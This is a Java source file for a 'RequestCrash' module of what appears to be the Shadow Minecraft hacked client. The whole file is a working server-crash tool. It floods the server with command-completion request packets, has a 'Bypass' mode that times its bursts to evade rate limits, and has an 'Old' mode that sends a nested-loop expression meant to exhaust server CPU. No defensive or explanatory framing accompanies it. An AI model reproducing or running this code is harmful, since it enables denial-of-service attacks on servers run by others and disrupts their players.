/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.crash;

import java.util.Random;

import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.shadow.client.feature.config.DoubleSetting;
import net.shadow.client.feature.config.EnumSetting;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;

public class RequestCrash extends Module {

    int ticks;
    final EnumSetting<Mode> mode = this.config.create(new EnumSetting.Builder<>(Mode.Basic).name("Mode").description("Mode to crash with").get());
    final DoubleSetting repeat = this.config.create(new DoubleSetting.Builder(20).min(1).max(500).name("Power").description("Power of the crash").get());
    
    public RequestCrash() {
        super("RequestCrash", "Crash the server using a bunch of requests", ModuleType.CRASH);
    }

    @Override
    public void tick() {
        switch(mode.getValue()){
            case Basic -> {
                for (int i = 0; i < repeat.getValue(); i++) {
                    client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/"));
                }
            }

            case Bypass -> {
                ticks++;
                if (ticks % 100 == 0) {
                    for (int i = 0; i < 275; i++) {
                        client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/"));
                    }
                }
            }

            case Old -> {
                client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(new Random().nextInt(100), "/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}"));
                this.setEnabled(false);
            }

            case Players -> {
                for (int i = 0; i < repeat.getValue(); i++) {
                    client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, ""));
                }
            }
        }
    }

    @Override
    public void enable() {
    }

    @Override
    public void disable() {
    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }

    public enum Mode {
        Basic,
        Bypass,
        Old,
        Players
    }
}
